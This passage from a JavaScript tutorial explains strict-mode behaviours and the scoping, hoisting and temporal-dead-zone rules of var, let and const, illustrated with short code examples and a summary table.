**8. Assignment to Getter-Only Properties**

```javascript
// Sloppy mode
let obj = {
  get x() { return 10; }
};
obj.x = 20;  // Silent failure

// Strict mode
"use strict";
let obj = {
  get x() { return 10; }
};
obj.x = 20;  // TypeError: Cannot set property x
```

**9. Adding Properties to Non-Extensible Objects**

```javascript
// Sloppy mode
let obj = {};
Object.preventExtensions(obj);
obj.newProp = 10;  // Silent failure

// Strict mode
"use strict";
let obj = {};
Object.preventExtensions(obj);
obj.newProp = 10;  // TypeError: Cannot add property
```

**10. `this` in Functions**

```javascript
// Sloppy mode
function f() {
  console.log(this);  // Global object (window in browsers)
}
f();

// Strict mode
"use strict";
function f() {
  console.log(this);  // undefined
}
f();

// Method calls: 'this' works the same in both modes
let obj = {
  method() {
    console.log(this);  // obj in both modes
  }
};
obj.method();
```

**11. `arguments` and Parameters**

```javascript
// Sloppy mode
function f(x) {
  x = 10;
  console.log(arguments[0]);  // 10 (arguments tracks parameter)
}
f(5);

// Strict mode
"use strict";
function f(x) {
  x = 10;
  console.log(arguments[0]);  // 5 (arguments doesn't track)
}
f(5);
```

**12. `arguments.callee` and `arguments.caller`**

```javascript
// Sloppy mode
function f() {
  console.log(arguments.callee);  // The function itself
}
f();

// Strict mode
"use strict";
function f() {
  console.log(arguments.callee);  // TypeError
}
f();
```

**13. `function.caller` and `function.arguments`**

```javascript
// Sloppy mode
function f() {
  console.log(f.caller);     // Calling function
  console.log(f.arguments);  // Arguments object
}

// Strict mode
"use strict";
function f() {
  console.log(f.caller);     // TypeError
  console.log(f.arguments);  // TypeError
}
```

**14. Reserved Words as Identifiers**

```javascript
// Sloppy mode
let let = 5;           // OK (confusing)
let implements = {};   // OK

// Strict mode
"use strict";
let let = 5;           // SyntaxError
let implements = {};   // SyntaxError
let public = true;     // SyntaxError
let static = 10;       // SyntaxError
```

**15. `with` Statement**

```javascript
// Sloppy mode
let obj = { x: 10 };
with (obj) {
  console.log(x);  // 10
}

// Strict mode
"use strict";
with (obj) {  // SyntaxError: with not allowed
  console.log(x);
}
```

**16. `eval` Scope**

```javascript
// Sloppy mode
eval("var x = 10");
console.log(x);  // 10 (eval creates variable in surrounding scope)

// Strict mode
"use strict";
eval("var x = 10");
console.log(x);  // ReferenceError (eval has its own scope)
```

**17. `eval` and `arguments` as Identifiers**

```javascript
// Sloppy mode
let eval = 10;        // OK (bad idea)
let arguments = 20;   // OK (bad idea)

// Strict mode
"use strict";
let eval = 10;        // SyntaxError
let arguments = 20;   // SyntaxError
function f(eval) {}   // SyntaxError
```

#### **Complete Strict Mode Rules Summary:**

|Behavior|Sloppy Mode|Strict Mode|
|---|---|---|
|Undeclared assignment|Creates global|ReferenceError|
|Delete variable|Silent fail|SyntaxError|
|Delete non-configurable|Silent fail|TypeError|
|Duplicate parameters|Allowed|SyntaxError|
|Octal literals (`0123`)|Allowed|SyntaxError|
|Octal escapes (`\251`)|Allowed|SyntaxError|
|Read-only assignment|Silent fail|TypeError|
|Getter-only assignment|Silent fail|TypeError|
|Non-extensible assignment|Silent fail|TypeError|
|`this` in function|Global object|`undefined`|
|`arguments` tracking|Tracks params|Doesn't track|
|`arguments.callee`|Allowed|TypeError|
|`arguments.caller`|Allowed|TypeError|
|`function.caller`|Allowed|TypeError|
|`function.arguments`|Allowed|TypeError|
|Future reserved words|Allowed|SyntaxError|
|`with` statement|Allowed|SyntaxError|
|`eval` scope|Leaks to parent|Own scope|
|`eval` as identifier|Allowed|SyntaxError|
|`arguments` as identifier|Allowed|SyntaxError|

#### **When to Use Strict Mode:**

**Always use strict mode:**

- In all new code
- In ES6 modules (automatic)
- In classes (automatic)
- When using modern tooling (transpilers enforce it)

**Be careful with strict mode:**

- When concatenating files (one "use strict" affects all)
- In browser console (may not support strict mode commands)
- With legacy code that depends on sloppy mode

**Mixing strict and sloppy:**

```javascript
// file1.js (strict)
"use strict";
function strictFunc() { }

// file2.js (sloppy)
function sloppyFunc() { }

// If concatenated:
// "use strict";  <-- applies to both files!
// function strictFunc() { }
// function sloppyFunc() { }  <-- now also strict!
```

**Solution: Use IIFE or modules**

```javascript
// file1.js
(function() {
  "use strict";
  function strictFunc() { }
})();

// file2.js
(function() {
  function sloppyFunc() { }
})();
```

Or use ES6 modules (always strict).

#### **Best Practices:**

1. **Always use strict mode** in new code
2. **Use ES6 modules** (automatic strict mode)
3. **Use linters** (ESLint enforces strict mode by default)
4. **Use build tools** that handle strict mode properly
5. **Test legacy code** before adding strict mode
6. **Educate team members** on strict mode benefits
7. **Use `"use strict"`** at function level if global is problematic

---

## 1.2 Variables and Declarations

### 1.2.1 `var`: Function-Scoped Declaration

### Basic Syntax and Semantics

`var` declares function-scoped variables. It's the oldest declaration keyword, predating ES6.

```javascript
var x;           // Declaration without initialization
var y = 10;      // Declaration with initialization
var a, b, c;     // Multiple declarations
var m = 1, n = 2, o = 3;  // Multiple declarations with initialization
```

**Key Characteristics:**

- Function-scoped (or globally scoped if outside any function)
- Hoisted to the top of its scope
- Can be re-declared in the same scope
- Creates property on global object when declared globally
- No Temporal Dead Zone

---

### Function Scoping Deep Dive

`var` declarations are scoped to the **nearest enclosing function**, not block:

```javascript
function example() {
  if (true) {
    var x = 10;
  }
  console.log(x);  // 10 - accessible outside if block
}

// Block scoping doesn't apply
{
  var y = 20;
}
console.log(y);  // 20 - accessible outside block
```

**Why this matters:**

```javascript
function processUsers(users) {
  for (var i = 0; i < users.length; i++) {
    var user = users[i];  // 'user' is function-scoped
    // Process user
  }
  
  console.log(i);     // users.length (i leaked out of loop)
  console.log(user);  // last user (user leaked out of loop)
}
```

All `var` declarations in a function exist throughout the entire function, creating a single binding shared across all blocks.

---

### Global Scope Behavior

`var` at the top level creates a **property on the global object**:

**Browser Environment:**

```javascript
var globalVar = "test";
console.log(window.globalVar);     // "test"
console.log(globalThis.globalVar); // "test"

// These are identical
window.globalVar = "modified";
console.log(globalVar);  // "modified"
```

**Node.js Environment:**

```javascript
// Top-level in .js file (CommonJS)
var globalVar = "test";
console.log(global.globalVar);     // undefined (module scope!)
console.log(globalThis.globalVar); // undefined

// Only creates global property in REPL or non-module context
```

**Important distinction:** In Node.js modules, top-level `var` is module-scoped, not truly global. In browsers, it's always global.

---

### Hoisting Mechanics

Hoisting is often misunderstood. It's not that code is literally "moved" to the topâ€”it's about how the JavaScript engine processes declarations during the compilation phase.

**What actually happens:**

```javascript
console.log(x);  // undefined (not ReferenceError!)
var x = 5;
console.log(x);  // 5
```

**Compilation phase:**

1. Engine scans for all `var` declarations
2. Creates bindings in the current execution context
3. Initializes all `var` bindings to `undefined`
4. Executes code line by line

**Conceptual transformation:**

```javascript
var x;           // Declaration hoisted and initialized to undefined
console.log(x);  // undefined
x = 5;           // Assignment stays in place
console.log(x);  // 5
```

**Complex hoisting example:**

```javascript
var x = 'outer';

function test() {
  console.log(x);  // undefined (not 'outer'!)
  var x = 'inner';
  console.log(x);  // 'inner'
}

test();
```

**Why `undefined` not `'outer'`?**

The `var x` inside `test()` is hoisted to the top of the function, creating a local binding that shadows the outer `x`. Before assignment, it's `undefined`.

**Conceptual transformation:**

```javascript
var x = 'outer';

function test() {
  var x;           // Hoisted, initialized to undefined
  console.log(x);  // undefined
  x = 'inner';
  console.log(x);  // 'inner'
}

test();
```

---

### Re-declaration Semantics

`var` allows re-declaration in the same scope:

```javascript
var x = 10;
var x = 20;  // No error, x is now 20
var x;       // No error, x remains 20 (no re-initialization)

console.log(x);  // 20
```

**With initialization:**

```javascript
var count = 1;
var count = 2;     // Overwrites
console.log(count); // 2
```

**Without re-initialization:**

```javascript
var count = 1;
var count;         // Doesn't reset to undefined
console.log(count); // Still 1
```

**Why this is dangerous:**

```javascript
// File 1
var config = { apiUrl: "https://api.example.com" };

// File 2 (concatenated or loaded later)
var config = { timeout: 5000 };  // Whoops! Overwrote config

// Result: original config lost
console.log(config);  // { timeout: 5000 }
```

This silent overwrites are why `var` is problematic in large codebases.

---

### The Classic Loop Problem

One of `var`'s most infamous issues:

```javascript
for (var i = 0; i < 3; i++) {
  setTimeout(function() {
    console.log(i);
  }, 100);
}

// Output: 3, 3, 3 (not 0, 1, 2)
```

**Why?**

1. `var i` is function-scoped (or global-scoped here)
2. Only **one** `i` variable exists
3. Loop completes immediately, setting `i` to 3
4. Timeouts execute 100ms later
5. All three closures reference the same `i`, which is now 3

**Visual representation:**

```javascript
var i;  // Single variable hoisted to top

i = 0;  // First iteration
setTimeout(function() { console.log(i); }, 100);  // Captures reference to i

i = 1;  // Second iteration
setTimeout(function() { console.log(i); }, 100);  // Captures same i

i = 2;  // Third iteration
setTimeout(function() { console.log(i); }, 100);  // Captures same i

i = 3;  // Loop terminates, i is now 3

// 100ms later, all three functions execute
// They all reference the same i, which is 3
```

**ES5 solution (IIFE):**

```javascript
for (var i = 0; i < 3; i++) {
  (function(j) {  // Create new scope with parameter
    setTimeout(function() {
      console.log(j);
    }, 100);
  })(i);  // Pass current i value
}

// Output: 0, 1, 2
```

Each IIFE creates a new scope with its own `j` parameter.

**ES6 solution (just use `let`):**

```javascript
for (let i = 0; i < 3; i++) {
  setTimeout(function() {
    console.log(i);
  }, 100);
}

// Output: 0, 1, 2
```

---

### 1.2.2 `let`: Block-Scoped Declaration

### Basic Syntax and Semantics

`let` declares block-scoped variables with proper temporal semantics:

```javascript
let x;           // Declaration without initialization (x is undefined)
let y = 10;      // Declaration with initialization
let a, b, c;     // Multiple declarations
let m = 1, n = 2;  // Multiple declarations with initialization
```

**Key Characteristics:**

- Block-scoped
- Hoisted but not initialized (TDZ)
- Cannot be re-declared in the same scope
- Does not create global object property
- Temporal Dead Zone applies

---

### Block Scoping

`let` creates bindings that exist only within the nearest enclosing block `{}`:

```javascript
{
  let x = 10;
  console.log(x);  // 10
}
console.log(x);  // ReferenceError: x is not defined
```

**All blocks create scope:**

```javascript
// If blocks
if (true) {
  let x = 1;
}
console.log(x);  // ReferenceError

// For blocks
for (let i = 0; i < 3; i++) {
  let x = i;
}
console.log(i);  // ReferenceError
console.log(x);  // ReferenceError

// While blocks
while (false) {
  let x = 1;
}
console.log(x);  // ReferenceError

// Standalone blocks
{
  let x = 1;
  {
    let x = 2;  // Different variable (shadowing)
    console.log(x);  // 2
  }
  console.log(x);  // 1
}
```

**Function parameters and body:**

```javascript
function example(x) {  // Parameter x
  let y = 10;          // Local y
  
  if (true) {
    let x = 20;        // Different x, shadows parameter
    let y = 30;        // Different y, shadows outer let
    console.log(x, y); // 20, 30
  }
  
  console.log(x, y);   // (parameter value), 10
}
```

---

### Hoisting and the Temporal Dead Zone (TDZ)

`let` declarations **are hoisted** to the top of their block, but unlike `var`, they are **not initialized**. Accessing them before the declaration line results in a `ReferenceError`.

**The Temporal Dead Zone:**

```javascript
{
  // TDZ starts for x
  console.log(x);  // ReferenceError: Cannot access 'x' before initialization
  // TDZ continues
  let x = 10;      // TDZ ends for x
  console.log(x);  // 10
}
```

**Why it's called "Temporal":**

The dead zone is **temporal** (time-based), not spatial (location-based). It starts when the scope is entered and ends when the declaration is encountered during execution:

```javascript
{
  const getValue = () => x;  // Captures x (but doesn't execute yet)
  
  // getValue() here would throw ReferenceError
  
  let x = 10;  // TDZ ends
  
  console.log(getValue());  // 10 - now safe to call
}
```

**TDZ with `typeof`:**

Before ES6, `typeof` was "safe" for undeclared variables:

```javascript
console.log(typeof undeclaredVariable);  // "undefined" (no error)
```

With TDZ, this safety is lost:

```javascript
console.log(typeof x);  // ReferenceError (x is in TDZ)
let x;
```

But for truly undeclared variables, `typeof` still works:

```javascript
console.log(typeof completelyUndeclared);  // "undefined"
```

**Why TDZ exists:**

1. **Catch errors early**: Forces declarations before use
2. **Prevent `undefined` bugs**: `var`'s initialization to `undefined` masked bugs
3. **Const semantics**: `const` needs TDZ for consistency (can't initialize to `undefined`)
4. **Spec alignment**: Matches other languages' behavior

---

### No Re-declaration

`let` forbids re-declaration in the same scope:

```javascript
let x = 10;
let x = 20;  // SyntaxError: Identifier 'x' has already been declared
```

This applies even if one is `var`:

```javascript
var x = 10;
let x = 20;  // SyntaxError

let y = 10;
var y = 20;  // SyntaxError
```

**But shadowing is allowed:**

```javascript
let x = 1;
{
  let x = 2;  // Different scope, different variable
  console.log(x);  // 2
}
console.log(x);  // 1
```

**Cannot shadow in the same block:**

```javascript
let x = 1;
let x = 2;  // SyntaxError
```

**Function parameters and scope:**

```javascript
function f(x) {
  let x = 10;  // SyntaxError: x already declared (as parameter)
}

function g(x) {
  {
    let x = 10;  // OK: different scope
  }
}
```

---

### Loop Behavior and Per-Iteration Bindings

With `let`, each loop iteration creates a **new binding**:

```javascript
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}

// Output: 0, 1, 2
```

**What happens internally:**

```javascript
// Conceptually transformed to:
{
  let i = 0;
  {
    let i_0 = i;  // Iteration 0
    setTimeout(() => console.log(i_0), 100);
  }
  i++;
  {
    let i_1 = i;  // Iteration 1
    setTimeout(() => console.log(i_1), 100);
  }
  i++;
  {
    let i_2 = i;  // Iteration 2
    setTimeout(() => console.log(i_2), 100);
  }
  i++;
}
```

Each iteration gets its own `i` binding.

**`for...in` and `for...of`:**

```javascript
const arr = ['a', 'b', 'c'];

for (let value of arr) {
  setTimeout(() => console.log(value), 100);
}

// Output: a, b, c (each iteration has its own binding)
```

**`for` loop with closures:**

```javascript
const funcs = [];

for (let i = 0; i < 3; i++) {
  funcs.push(() => i);
}

console.log(funcs[0]());  // 0
console.log(funcs[1]());  // 1
console.log(funcs[2]());  // 2
```

Compare with `var`:

```javascript
const funcs = [];

for (var i = 0; i < 3; i++) {
  funcs.push(() => i);
}

console.log(funcs[0]());  // 3
console.log(funcs[1]());  // 3
console.log(funcs[2]());  // 3
```

---

### Global Scope Behavior

`let` at the global level does **not** create a property on the global object:

```javascript
let globalLet = "test";

console.log(window.globalLet);     // undefined (browsers)
console.log(global.globalLet);     // undefined (Node.js)
console.log(globalThis.globalLet); // undefined
console.log(globalLet);            // "test" (variable exists)
```

Global `let` and `const` exist in a separate **global lexical environment**, distinct from the global object's properties.

**Contrast with `var`:**

```javascript
var globalVar = "test";
console.log(window.globalVar);  // "test"

let globalLet = "test";
console.log(window.globalLet);  // undefined
```

---

### 1.2.3 `const`: Immutable Binding

### Basic Syntax and Semantics

`const` declares block-scoped constantsâ€”variables with an **immutable binding**:

```javascript
const PI = 3.14159;
const MAX_SIZE = 100;
const config = { apiUrl: "https://api.example.com" };
```

**Key Characteristics:**

- Block-scoped (same as `let`)
- Hoisted but not initialized (TDZ, same as `let`)
- Cannot be re-declared (same as `let`)
- **Must be initialized at declaration**
- **Binding is immutable** (cannot reassign)
- **Value is not necessarily immutable** (objects/arrays can be mutated)

---

### Immutable Binding vs Immutable Value

**Critical distinction:** `const` creates an **immutable binding**, not an immutable value.

**Primitives (immutable binding = immutable value):**

```javascript
const x = 10;
x = 20;  // TypeError: Assignment to constant variable
```

**Objects (immutable binding â‰  immutable value):**

```javascript
const obj = { count: 0 };

// Cannot reassign the binding
obj = { count: 1 };  // TypeError: Assignment to constant variable

// But can mutate the object
obj.count = 1;       // OK
obj.newProp = "hi";  // OK
delete obj.count;    // OK

console.log(obj);    // { newProp: "hi" }
```

**Arrays:**

```javascript
const arr = [1, 2, 3];

// Cannot reassign
arr = [4, 5, 6];     // TypeError

// But can mutate
arr.push(4);         // OK
arr[0] = 99;         // OK
arr.length = 0;      // OK (empties array)

console.log(arr);    // []
```

**Why this design?**

JavaScript uses **reference semantics** for objects. The `const` binding holds a **reference** to the object. That reference cannot change, but the object it points to can be modified.

```javascript
const obj = { x: 1 };
// obj â†’ Memory Address 0x1234 â†’ { x: 1 }

obj.x = 2;
// obj â†’ Memory Address 0x1234 â†’ { x: 2 }  (same reference, mutated object)

obj = { x: 3 };  // TypeError
// Trying to change: obj â†’ Memory Address 0x5678  (different reference)
```

---

### Initialization Required

`const` **must** be initialized at declaration:

```javascript
const x;  // SyntaxError: Missing initializer in const declaration

const y = 10;  // OK
```

**Why?**

Since `const` bindings cannot be reassigned, failing to initialize would create an unusable variable:

```javascript
const x;  // If this were allowed, x would be undefined forever
x = 10;   // Cannot assign to const
```

---

### Object Immutability with `Object.freeze()`

To make an object's properties immutable, use `Object.freeze()`:

```javascript
const obj = Object.freeze({ x: 1, y: 2 });

obj.x = 10;        // Silently fails (non-strict) or TypeError (strict)
obj.z = 3;         // Silently fails or TypeError
delete obj.x;      // Silently fails or TypeError

console.log(obj);  // { x: 1, y: 2 }
```

**Strict mode enforcement:**

```javascript
"use strict";

const obj = Object.freeze({ x: 1 });
obj.x = 10;  // TypeError: Cannot assign to read only property 'x'
```

**Shallow freeze:**

`Object.freeze()` is **shallow**â€”nested objects are not frozen:

```javascript
const obj = Object.freeze({
  x: 1,
  nested: { y: 2 }
});

obj.x = 10;           // TypeError
obj.nested.y = 20;    // OK (nested object not frozen)
obj.nested.z = 30;    // OK

console.log(obj);     // { x: 1, nested: { y: 20, z: 30 } }
```

**Deep freeze:**

```javascript
function deepFreeze(obj) {
  Object.freeze(obj);
  
  Object.getOwnPropertyNames(obj).forEach(prop => {
    if (obj[prop] !== null
        && (typeof obj[prop] === "object" || typeof obj[prop] === "function")
        && !Object.isFrozen(obj[prop])) {
      deepFreeze(obj[prop]);
    }
  });
  
  return obj;
}

const obj = deepFreeze({
  x: 1,
  nested: { y: 2 }
});

obj.nested.y = 20;  // TypeError (now frozen)
```

**Alternative: Immutable libraries**

For complex immutability needs, use libraries like:

- Immutable.js
- Immer
- seamless-immutable

---

### Scoping, Hoisting, and TDZ

`const` follows the same rules as `let`:

**Block-scoped:**

```javascript
{
  const x = 10;
}
console.log(x);  // ReferenceError
```

**Hoisted with TDZ:**

```javascript
{
  console.log(MAX);  // ReferenceError: Cannot access 'MAX' before initialization
  const MAX = 100;
}
```

**No re-declaration:**

```javascript
const x = 10;
const x = 20;  // SyntaxError
```

**No global object property:**

```javascript
const globalConst = "test";
console.log(window.globalConst);  // undefined
```

---

### 1.2.4 Hoisting Deep Dive

### What is Hoisting?

Hoisting is a **mental model** for understanding how JavaScript's engine processes variable and function declarations during the **compilation phase** before execution.

**Two phases of JavaScript execution:**

1. **Compilation (Creation) Phase:**
    - Scan code for declarations
    - Create bindings in execution context
    - Initialize `var` and function declarations
    - Create bindings (but don't initialize) for `let`, `const`, `class`
2. **Execution Phase:**
    - Execute code line by line
    - Assign values to variables
    - Call functions

---

### `var` Hoisting

**Source code:**

```javascript
console.log(x);  // undefined
var x = 5;
console.log(x);  // 5
```

**Compilation phase:**

1. Scan finds `var x`
2. Create binding `x` in function scope (or global scope)
3. Initialize `x` to `undefined`

**Execution phase:**

1. `console.log(x)` â†’ prints `undefined`
2. `x = 5` â†’ assigns 5 to `x`
3. `console.log(x)` â†’ prints `5`

**Conceptual transformation:**

```javascript
var x;           // Hoisted: declaration + initialization to undefined
console.log(x);  // undefined
x = 5;           // Assignment stays in place
console.log(x);  // 5
```

---

### `let` and `const` Hoisting

`let` and `const` **are hoisted**, but unlike `var`, they are **not initialized**. This creates the TDZ.

**Source code:**

```javascript
console.log(x);  // ReferenceError
let x = 5;
console.log(x);  // 5
```

**Compilation phase:**

1. Scan finds `let x`
2. Create binding `x` in block scope
3. **Do not initialize** (TDZ begins)

**Execution phase:**

1. `console.log(x)` â†’ `x` is in TDZ â†’ ReferenceError
2. `let x = 5` â†’ initialize `x` to `5` (TDZ ends)
3. `console.log(x)` â†’ prints `5`

**Proof that `let` is hoisted:**

```javascript
let x = 'outer';

{
  console.log(x);  // ReferenceError (not 'outer')
  let x = 'inner';
}
```

If `let x` were not hoisted, `console.log(x)` would print `'outer'`. Instead, it throws ReferenceError because the inner `let x` is hoisted to the top of the block, creating a TDZ.

---

### Function Hoisting

**Function declarations are fully hoisted:**

```javascript
greet();  // "Hello"

function greet() {
  console.log("Hello");
}
```

**Compilation phase:**

1. Scan finds `function greet() {...}`
2. Create binding `greet` in function scope
3. Initialize `greet` to the function object

**Function expressions follow variable hoisting rules:**

```javascript
greet();  // TypeError: greet is not a function

var greet = function() {
  console.log("Hello");
};
```

The `var greet` is hoisted and initialized to `undefined`. Calling `greet()` tries to invoke `undefined`, causing a TypeError.

**With `let` or `const`:**

```javascript
greet();  // ReferenceError

let greet = function() {
  console.log("Hello");
};
```

---

### Variable vs Function Hoisting Priority

**When both variable and function have the same name:**

```javascript
console.log(typeof foo);  // "function"

var foo = "variable";

function foo() {
  console.log("function");
}

console.log(typeof foo);  // "string"
```

**Compilation phase:**

1. `var foo` creates binding `foo`, initializes to `undefined`
2. `function foo() {}` creates binding `foo`, initializes to function
3. **Function wins** (overwrites the `undefined`)

**Execution phase:**

1. `console.log(typeof foo)` â†’ `"function"`
2. `foo = "variable"` â†’ reassigns `foo` to `"variable"`
3. `console.log(typeof foo)` â†’ `"string"`

**Function declarations take precedence over variable declarations during hoisting.**

---

### Hoisting in Different Scopes

**Global scope:**

```javascript
var globalVar = 1;
let globalLet = 2;
const globalConst = 3;

function globalFunc() {}
```

All hoisted to global scope, but:

- `var globalVar` creates property on global object
- `let globalLet` and `const globalConst` exist in global lexical environment
- `function globalFunc` creates property on global object

**Function scope:**

```javascript
function example() {
  var functionVar = 1;
  let functionLet = 2;
  const functionConst = 3;
  
  function nestedFunc() {}
}
```

All hoisted to `example` function's scope.

**Block scope:**

```javascript
{
  var blockVar = 1;     // Hoisted to enclosing function scope (or global)
  let blockLet = 2;     // Hoisted to block scope
  const blockConst = 3; // Hoisted to block scope
}

console.log(blockVar);   // 1
console.log(blockLet);   // ReferenceError
console.log(blockConst); // ReferenceError
```

---

### 1.2.5 Temporal Dead Zone (TDZ) Deep Dive

### Definition

The **Temporal Dead Zone** is the period between entering a scope and the point where a `let` or `const` variable is declared and initialized. During this time, the variable exists but cannot be accessed.

**Temporal (time-based), not spatial (location-based):**

```javascript
{
  // TDZ for x starts (scope entered)
  const f = () => x;  // Captures x, but doesn't execute
  // TDZ continues
  let x = 10;         // TDZ ends (declaration reached)
  f();                // 10 - now safe
}
```

---

### TDZ Triggers

**Accessing variable before declaration:**

```javascript
{
  console.log(x);  // ReferenceError: Cannot access 'x' before initialization
  let x = 10;
}
```

**Using in expression:**

```javascript
{
  let x = x + 1;  // ReferenceError (right-side x is in TDZ)
}
```

**Function calls:**

```javascript
{
  function getValue() {
    return x;
  }
  
  getValue();  // ReferenceError (x in TDZ)
  let x = 10;
}
```

---

### TDZ and Default Parameters

Function parameters are evaluated **left-to-right**, and each parameter is in TDZ until it's initialized:

```javascript
function example(a = b, b = 2) {
  return [a, b];
}

example();  // ReferenceError: Cannot access 'b' before initialization
```

**Why?**

1. Evaluate `a = b`
2. `b` is in TDZ (not yet initialized)
3. ReferenceError

**Correct order:**

```javascript
function example(b = 2, a = b) {
  return [a, b];
}

example();  // [2, 2]
```

**More complex example:**

```javascript
function f(x = y, y = 10) {
  return x + y;
}

f();  // ReferenceError
```

```javascript
function f(y = 10, x = y) {
  return x + y;
}

f();  // 20
```

---

### TDZ and `typeof`

Before ES6, `typeof` was "safe" for undeclared variables:

```javascript
console.log(typeof undeclaredVariable);  // "undefined"
```

With TDZ, this safety is lost for `let` and `const`:

```javascript
{
  console.log(typeof x);  // ReferenceError
  let x = 10;
}
```

But for truly undeclared variables (not in TDZ), `typeof` still works:

```javascript
console.log(typeof completelyUndeclared);  // "undefined"
```

**Practical issue:**

```javascript
// Check if a variable exists
if (typeof myVar !== 'undefined') {
  // Use myVar
}

// If myVar is let/const in enclosing scope, this throws ReferenceError!
{
  if (typeof myVar !== 'undefined') {  // ReferenceError
    console.log(myVar);
  }
  let myVar = 10;
}
```

**Solution: Try-catch:**

```javascript
{
  let exists = false;
  try {
    myVar;
    exists = true;
  } catch (e) {
    exists = false;
  }
  
  let myVar = 10;
}
```

---

### TDZ in Closures

Closures capture variables, including their TDZ state:

```javascript
{
  const funcs = [];
  
  funcs.push(() => x);  // Captures x (in TDZ)
  
  // funcs[0]() would throw ReferenceError here
  
  let x = 10;  // TDZ ends
  
  funcs[0]();  // 10 - now safe
}
```

**Timing matters:**

```javascript
{
  let funcs = [];
  
  for (let i = 0; i < 3; i++) {
    funcs.push(() => arr[i]);  // Captures arr (in TDZ)
  }
  
  // funcs[0]() would throw ReferenceError here
  
  let arr = [10, 20, 30];  // TDZ ends
  
  console.log(funcs[0]());  // 10
  console.log(funcs[1]());  // 20
  console.log(funcs[2]());  // 30
}
```

---

### Why TDZ Exists

**1. Catch errors early:**

Forces developers to declare before use, preventing subtle bugs:

```javascript
// Without TDZ (var behavior)
console.log(config);  // undefined (misleading)
var config = loadConfig();

// With TDZ (let/const behavior)
console.log(config);  // ReferenceError (clear error)
let config = loadConfig();
```

**2. Prevent `undefined` pollution:**

`var`'s automatic initialization to `undefined` masked bugs:

```javascript
// var: bug not caught
function processUser() {
  console.log(user);  // undefined (should be error!)
  // ... lots of code ...
  var user = getUser();
}

// let: bug caught immediately
function processUser() {
  console.log(user);  // ReferenceError (caught early!)
  // ... lots of code ...
  let user = getUser();
}
```

**3. `const` semantics:**

`const` cannot be initialized to `undefined` then assigned later. TDZ makes `let` and `const` consistent:

```javascript
// Without TDZ, this would be problematic
const x;  // Initialize to undefined?
x = 10;   // Then assign? (violates const semantics)

// TDZ solves this: const must be initialized at declaration
const x = 10;  // OK
```

**4. Align with other languages:**

Most block-scoped languages (Java, C#, Rust) forbid use-before-declaration. TDZ aligns JavaScript with these expectations.

---

### 1.2.6 Global Variables and `globalThis`

### Global Scope Mechanics

JavaScript has **two types of global variables**:

1. **Global object properties** (created by `var` and function declarations)
2. **Global lexical environment bindings** (created by `let` and `const`)

**Browser example:**

```javascript
var varGlobal = 1;
let letGlobal = 2;
const constGlobal = 3;

console.log(window.varGlobal);    // 1 (property)
console.log(window.letGlobal);    // undefined (not a property)
console.log(window.constGlobal);  // undefined (not a property)

console.log(varGlobal);           // 1
console.log(letGlobal);           // 2
console.log(constGlobal);         // 3
```

**Why the distinction?**

ES6 needed backward compatibility with `var` (which creates global properties) while providing better behavior for `let` and `const` (which don't pollute the global object).

---

### The Global Object

The global object is environment-dependent:

- **Browsers:** `window` (also `self`, `frames`)
- **Web Workers:** `self`
- **Node.js (CommonJS):** `global`
- **Node.js (ES modules):** No global object at top level (module scope)

**Historical inconsistency:**

```javascript
// Browser
var global = window;

// Node.js
var global = global;  // Already exists

// Web Worker
var global = self;
```

---

### `globalThis`: Universal Global Access

ES2020 introduced `globalThis` as a **standardized way** to access the global object across all environments:

```javascript
// Works everywhere
console.log(globalThis);

// Browser
console.log(globalThis === window);  // true

// Node.js (REPL or non-module)
console.log(globalThis === global);  // true

// Web Worker
console.log(globalThis === self);    // true
```

**Before `globalThis`, you needed this monstrosity:**

```javascript
var getGlobal = function() {
  if (typeof self !== 'undefined') { return self; }
  if (typeof window !== 'undefined') { return window; }
  if (typeof global !== 'undefined') { return global; }
  throw new Error('unable to locate global object');
};

var globalObj = getGlobal();
```

**Now:**

```javascript
var globalObj = globalThis;
```

---

### Global Pollution

**Problem:**

Every global variable can be accidentally overwritten or conflict with other scripts:

```javascript
// Library A
var config = { theme: 'dark' };

// Library B (loaded later)
var config = { apiKey: '12345' };  // Whoops! Overwrote Library A's config

// Your code
console.log(config);  // { apiKey: '12345' } (Library A broken)
```

**Solutions:**

**1. Use modules (best):**

ES6 modules have their own scope:

```javascript
// moduleA.js
let config = { theme: 'dark' };
export { config };

// moduleB.js
let config = { apiKey: '12345' };
export { config };

// main.js
import { config as configA } from './moduleA.js';
import { config as configB } from './moduleB.js';
// No conflict!
```

**2. Use IIFE (ES5 pattern):**

```javascript
// Library A
(function() {
  var config = { theme: 'dark' };
  // Use config...
})();

// Library B
(function() {
  var config = { apiKey: '12345' };
  // Use config...
})();

// No conflict - each IIFE has its own scope
```

**3. Use namespaces:**

```javascript
var LibraryA = LibraryA || {};
LibraryA.config = { theme: 'dark' };

var LibraryB = LibraryB || {};
LibraryB.config = { apiKey: '12345' };

console.log(LibraryA.config);  // { theme: 'dark' }
console.log(LibraryB.config);  // { apiKey: '12345' }
```

**4. Use `let`/`const` instead of `var`:**

At least they don't create global object properties:

```javascript
let config = { theme: 'dark' };
// window.config is undefined (doesn't pollute global object)
```

---

### Global Variables Best Practices

1. **Minimize globals**: Use modules or IIFEs
2. **Never use `var` at global level**: Use `let` or `const`
3. **Use strict mode**: Prevents accidental global creation
4. **Use linters**: Catch undeclared variable assignments
5. **Prefix globals if necessary**: `APP_CONFIG` instead of `config`
6. **Use `Object.freeze()` for global constants:**

```javascript
const CONFIG = Object.freeze({
  API_URL: 'https://api.example.com',
  TIMEOUT: 5000
});
```

**7. Check for conflicts before declaring:**

```javascript
if (typeof MyLibrary === 'undefined') {
  let MyLibrary = {};
}
```

---

### 1.2.7 Practical Guidelines

### When to Use Each Declaration

**Use `const` by default:**

- Values that won't be reassigned
- Object and array references (even if mutated)
- Function expressions
- Imported modules
- Configuration objects

```javascript
const API_URL = 'https://api.example.com';
const config = { timeout: 5000 };
const users = [];

const getUserById = (id) => users.find(u => u.id === id);

// Can mutate
config.timeout = 10000;
users.push({ id: 1, name: 'Alice' });
```

**Use `let` when reassignment is needed:**

- Loop counters
- Conditional assignments
- Accumulator variables
- State that changes

```javascript
let count = 0;
let result;

for (let i = 0; i < 10; i++) {
  count += i;
}

if (condition) {
  result = 'yes';
} else {
  result = 'no';
}
```

**Never use `var` in modern code:**

- Legacy code maintenance only
- No legitimate use cases in ES6+

---

### Common Patterns

**1. Loop iteration:**

```javascript
// Use let for traditional loops
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);
}

// Use const for for-of (no reassignment)
for (const item of arr) {
  console.log(item);
}

// Use const for for-in
for (const key in obj) {
  console.log(key, obj[key]);
}
```

